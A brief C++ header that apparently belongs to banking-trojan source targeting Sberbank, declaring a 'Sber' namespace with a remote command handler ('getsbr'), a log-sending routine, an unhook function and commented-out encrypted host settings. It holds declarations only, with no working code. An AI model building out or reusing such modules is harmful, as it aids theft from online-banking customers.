#ifndef		SBERH
#define		SBERH

#include <windows.h>


//#define SBERHOSTS_PARAM_SIZE      100
//#define SBERHOSTS_PARAM_NAME      "__SBER_HOSTS__\0"
//#define SBERHOSTS_PARAM_ENCRYPTED true

namespace Sber
{

bool Init( const char* appName, DWORD appHash );

const char GetSbr[] = "getsbr\0";
bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
void SendLogIfReestr();

};

void UnhookSber();

#endif		//SBERH